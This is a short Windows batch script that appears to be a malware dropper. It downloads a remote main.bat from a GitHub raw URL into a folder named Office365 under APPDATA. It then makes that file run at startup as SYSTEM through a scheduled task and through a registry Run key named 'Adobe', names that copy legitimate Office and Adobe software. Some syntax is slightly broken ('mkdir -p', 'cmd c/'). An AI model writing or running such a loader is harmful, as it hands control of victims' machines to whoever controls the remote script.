@echo off
mkdir -p %APPDATA%\Office365
curl -s https://raw.githubusercontent.com/qufyu/0024/main/main.bat > %APPDATA%\Office365\main.bat 
schtasks /create /sc onstart /tn officeStart /tr %APPDATA%\Office365\main.bat /ru System
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Adobe /t REG_SZ /d "cmd c/ %APPDATA%\Office365\main.bat"
